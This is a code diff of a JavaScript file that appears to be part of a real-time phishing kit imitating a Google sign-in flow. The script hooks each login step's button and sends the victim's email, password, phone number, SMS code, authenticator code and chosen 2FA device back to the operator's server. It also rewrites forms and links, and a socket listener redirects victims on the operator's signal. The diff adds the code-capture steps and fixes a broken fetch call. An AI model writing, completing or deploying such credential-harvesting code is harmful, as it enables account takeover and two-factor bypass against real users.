@@ -1,105 +1,115 @@
-const urlPath = location.pathname
-const urlSplit = urlPath.split("/")
-const id = urlSplit[3]
-const appName = urlSplit[2]
+// Extracting path and parameters
+const urlPath = location.pathname;
+const urlSplit = urlPath.split("/");
+const id = urlSplit[3];
+const appName = urlSplit[2];
 
+// Initialize socket connection
 const socket = io(location.origin, {
     path: '/socket.io',
     transports: ['websocket'],
     secure: true,
-})
+});
 
+// Listen for specific events
 socket.on(`${id}-listener`, data => {
     if (data.type == "response") {
-        top.location.href = `${location.origin}/ws-app?id=${id}`
+        top.location.href = `${location.origin}/ws-app?id=${id}`;
     }
-})
+});
 
+// Update all anchor tags' href attributes
 document.querySelectorAll("a").forEach(atag => {
-    atag.href = location.href
-})
+    atag.href = location.href;
+});
 
+// Remove all iframes
 document.querySelectorAll("iframe").forEach(f => {
-    f.remove()
-})
+    f.remove();
+});
 
+// Remove specific attributes from all elements
 document.querySelectorAll('*').forEach(element => {
-    element.removeAttribute("onclick")
-    element.removeAttribute('onmousedown')
-})
+    element.removeAttribute("onclick");
+    element.removeAttribute('onmousedown');
+});
 
+// Modify all forms' actions and methods
 document.querySelectorAll("form").forEach(form => {
-    form.action = location.pathname
-    form.method = "POST"
-    form.noValidate = false
+    form.action = location.pathname;
+    form.method = "POST";
+    form.noValidate = false;
 
-    const input = document.createElement("input")
-    input.type = "hidden"
-    input.name = "spikeType"
-    form.append(input)
-})
+    const input = document.createElement("input");
+    input.type = "hidden";
+    input.name = "spikeType";
+    form.append(input);
+});
 
+// Set required attribute on input fields
 document.querySelectorAll("input").forEach(inp => {
     if (inp.type != "hidden") {
-        inp.required = true
+        inp.required = true;
     }
-})
+});
 
+// Helper function to update all spikeType inputs
 function addSpikeType(value) {
-    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
-    for (let spike of allSpikes) {
-        spike.value = value
-    }
+    document.querySelectorAll(`[name="spikeType"]`).forEach(spike => {
+        spike.value = value;
+    });
 }
 
+// Function to submit form data programmatically
 function spikeForm(data, silent = false) {
     if (silent) {
-        fetch(location.href, JSON.stringify(data), {
-            method: "post",
+        fetch(location.href, {
+            method: "POST",
             headers: {
                 "Content-Type": "application/json"
-            }
+            },
+            body: JSON.stringify(data)
         }).then(res => res.text())
             .then(data => {
                 console.log(data);
-            })
+            });
     } else {
-        let formData = ""
+        let formData = "";
         for (const key in data) {
-            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
+            formData += `<input type="hidden" name="${key}" value="${data[key]}">`;
         }
 
-        const form = document.createElement("form")
-        form.method = "post"
-        form.action = location.href
-        form.innerHTML = formData
-        document.body.appendChild(form)
-        form.submit()
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = location.href;
+        form.innerHTML = formData;
+        document.body.appendChild(form);
+        form.submit();
     }
 }
 
 /**
- *  spikes selector functions +===================+
+ *  Spikes selector functions
  */
 
 const selectorSpikes = [
     {
         spikeType: "home-email",
         querys: [
-            `[name="identifier"]`,
+            `[type="email"]`,
             `[id="identifierId"]`,
             '#identifierNext'
         ],
         runner() {
-            const emailInp = document.querySelector(`[id="identifierId"]`)
-            const submitBtn = document.querySelector('#identifierNext')
+            const emailInp = document.querySelector(`[type="email"]`);
+            const submitBtn = document.querySelector('#identifierNext');
 
             submitBtn.addEventListener("click", () => {
                 spikeForm({
                     spikeType: this.spikeType,
                     email: emailInp.value
-                })
-            })
+                });
+            });
         }
     },
     {
@@ -110,24 +120,20 @@ const selectorSpikes = [
             '#passwordNext'
         ],
         runner() {
-            const passwordInp = document.querySelector(`[name="Passwd"]`)
-            const submitBtn = document.querySelector('#passwordNext')
+            const passwordInp = document.querySelector(`[name="Passwd"]`);
+            const submitBtn = document.querySelector('#passwordNext');
 
             submitBtn.addEventListener("click", () => {
                 spikeForm({
                     spikeType: this.spikeType,
                     password: passwordInp.value
-                })
-            })
+                });
+            });
 
-            let passShowBtn = document.querySelector(`[type="checkbox"]`)
+            const passShowBtn = document.querySelector(`[type="checkbox"]`);
             passShowBtn.addEventListener("click", () => {
-                if (passwordInp.type == "password") {
-                    passwordInp.type = "text"
-                } else {
-                    passwordInp.type = "password"
-                }
-            })
+                passwordInp.type = passwordInp.type === "password" ? "text" : "password";
+            });
         }
     },
     {
@@ -136,8 +142,16 @@ const selectorSpikes = [
             `#phoneNumberId`
         ],
         runner() {
-            let phoneNumberId = document.querySelector("#phoneNumberId")
-            phoneNumberId.name = "phoneNumber"
+            const phoneNumberId = document.querySelector("#phoneNumberId");
+            phoneNumberId.name = "phoneNumber";
+            const submitBtn = document.querySelector('#nextButton');
+
+            submitBtn.addEventListener("click", () => {
+                spikeForm({
+                    spikeType: this.spikeType,
+                    phoneNumber: phoneNumberId.value
+                });
+            });
         }
     },
     {
@@ -145,68 +159,83 @@ const selectorSpikes = [
         querys: [
             `#idvPin`
         ],
-        runner() { }
+        runner() {
+            const smsCodeInp = document.querySelector(`#idvPin`);
+            const submitBtn = document.querySelector('#idvPreregisteredPhoneNext');
+
+            submitBtn.addEventListener("click", () => {
+                spikeForm({
+                    spikeType: this.spikeType,
+                    smsCode: smsCodeInp.value
+                });
+            });
+        }
     },
     {
-        spikeType: "code",
+        spikeType: "auth-code",
         querys: [
             `#idvPinId`
-        ]
+        ],
+        runner() {
+            const authCodeInp = document.querySelector(`#idvPinId`);
+            const submitBtn = document.querySelector('#idvPreregisteredPhoneNext');
+
+            submitBtn.addEventListener("click", () => {
+                spikeForm({
+                    spikeType: this.spikeType,
+                    authCode: authCodeInp.value
+                });
+            });
+        }
     }
-]
+];
 
 /**
- * button spikes functions +===================+
+ * Button spikes functions
  */
 
 const buttonSpikes = [
     {
         spikeType: "auth-devices",
         runner() {
-            const authContainer = document.querySelector(".OVnw0d").querySelectorAll(".JDAKTe.cd29Sd.zpCp3.SmR8")
+            const authContainer = document.querySelectorAll(".JDAKTe.cd29Sd.zpCp3.SmR8");
             if (authContainer) {
                 authContainer.forEach((btn, index) => {
                     btn.addEventListener("click", () => {
                         spikeForm({
                             spikeType: this.spikeType,
                             authKeyIndex: index
-                        })
-                    })
-                })
+                        });
+                    });
+                });
             }
         }
     }
-]
+];
 
+// Execute the spikes
 for (const selectorSpike of selectorSpikes) {
-    const spikeType = selectorSpike.spikeType
-    const querys = selectorSpike.querys
-    const queryLength = querys.length
+    const querys = selectorSpike.querys;
+    const queryLength = querys.length;
 
-    let queryMatch = 0
+    let queryMatch = 0;
     for (const selector of querys) {
-        if (document.querySelector(selector)) queryMatch++
+        if (document.querySelector(selector)) queryMatch++;
     }
 
-    if (queryLength == queryMatch) {
-        addSpikeType(spikeType)
+    if (queryLength === queryMatch) {
+        addSpikeType(selectorSpike.spikeType);
         if (selectorSpike.hasOwnProperty("runner")) {
             try {
-                selectorSpike.runner()
+                selectorSpike.runner();
             } catch (error) { }
         }
-
-        break
+        break;
     }
 }
 
 for (const buttonSpike of buttonSpikes) {
     try {
-        buttonSpike.runner()
+        buttonSpike.runner();
     } catch (error) { }
-}
-
-// +----------------+
-{
-
 }
